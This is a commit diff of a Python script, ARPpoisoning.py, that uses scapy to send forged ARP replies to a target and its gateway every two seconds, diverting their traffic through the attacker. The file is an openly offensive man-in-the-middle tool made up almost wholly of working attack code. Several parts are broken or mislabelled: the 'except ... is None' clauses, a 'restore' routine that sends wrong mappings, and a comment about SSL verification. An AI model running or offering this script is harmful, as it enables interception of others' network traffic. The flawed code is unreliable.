fe6c0886e054c64ba5d1f943eb5126a6ee5ac102
Brunotti12 <128841706+Brunotti12@users.noreply.github.com>
2024-11-07 20:26:46 +0100

    Update ARPpoisoning.py

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -1,43 +1,45 @@
-from scapy.all import ARP, Ether, send, srp, conf
+from scapy.all import ARP, Ether, send, conf
 import time
+from router_ip_mac import get_router_ip
+from sniffer import get_target_ip, get_mac
 
 # Disable Scapy's SSL verification
 conf.verb = 0  # Disable verbose output
 
 def arp_poison(target_ip, target_mac, spoof_ip):
-    # Create ARP response packet
     arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
     ether = Ether(dst=target_mac) / arp_response
-
-    # Send the packet
     send(ether)
 
-def get_mac(ip):
-    # Send ARP request to get MAC address
-    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
-    return ans[0][1].hwsrc if ans else None
 
-def main(target_ip, gateway_ip):
+
+
+try:
+    target_ip = get_target_ip()
+    gateway_ip = get_router_ip()
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
 
-    if target_mac is None or gateway_mac is None:
-        print("Could not find MAC addresses.")
-        return
 
     print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
-
-    try:
-        while True:
-            # Poison the target
-            arp_poison(target_ip, target_mac, gateway_ip)
-            # Poison the gateway
-            arp_poison(gateway_ip, gateway_mac, target_ip)
-            time.sleep(2)  # Send every 2 seconds
-    except KeyboardInterrupt:
-        print("ARP poisoning stopped.")
-
-if __name__ == "__main__":
-    target_ip = "192.168.1.10"  # Change to your target's IP
-    gateway_ip = "192.168.1.1"  # Change to your gateway's IP
-    main(target_ip, gateway_ip)
+    while True:
+        # Poison the target
+        arp_poison(target_ip, target_mac, gateway_ip)
+        # Poison the gateway
+        arp_poison(gateway_ip, gateway_mac, target_ip)
+        time.sleep(2)  # Send every 2 seconds
+except KeyboardInterrupt:
+    print("Restoring ARP tables. . .")
+    for i in range(4):
+        arp_poison(target_ip, target_mac, target_ip)
+        arp_poison(gateway_ip, gateway_mac, gateway_ip)
+        time.sleep(2)
+    print("ARP tables restored.")
+except target_mac is None:
+    print("Could not find target MAC")
+except gateway_mac is None:
+    print("Could not find gateway MAC")
+except gateway_ip is None:
+    print("Could not find gateway IP")
+except target_ip is None:
+    print("Target IP doesn't exist")
